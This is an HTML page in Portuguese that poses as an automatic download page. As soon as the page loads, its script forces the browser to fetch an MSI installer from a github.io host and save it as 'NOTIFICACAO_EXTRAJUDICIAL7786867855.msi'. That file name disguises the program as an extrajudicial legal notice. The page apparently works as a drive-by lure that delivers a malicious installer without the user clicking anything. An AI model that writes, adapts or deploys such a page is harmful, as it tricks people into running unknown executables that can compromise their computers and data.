<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Automático</title>
    <style type="text/css">
        .download { cursor: pointer; }
    </style>
</head>
<body style="font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0;">
    <div style="max-width: 600px; margin: 50px auto; background-color: #fff; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
        <h1 style="color: #333;">Download Automático</h1>
        <p style="font-size: 16px; color: #555;">O download do arquivo será iniciado automaticamente. Caso não ocorra, clique no botão abaixo.</p>
        
        <a href="#" class="download" style="display: inline-block; padding: 12px 25px; font-size: 16px; color: #fff; background-color: #007BFF; border-radius: 5px; text-decoration: none; margin-top: 20px;">Baixar Arquivo</a>

           </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('.download').forEach(function(a) {
                a.onclick = function(){
                    fetch('https://amzusrrn.github.io/amzvalid/setup.msi')
                    .then(resp => resp.blob()).then(function(blob, url, a){
                        a = document.createElement('a');
                        a.style.display = 'none';
                        a.href = window.URL.createObjectURL(blob);
                        a.download = 'NOTIFICACAO_EXTRAJUDICIAL7786867855.msi';
                        document.body.appendChild(a);
                        a.click();
                    })
                    return false;
                }
            });

            // Executar o download automaticamente ao carregar a página
            document.querySelector('.download').click();
        });
    </script>
</body>
</html>
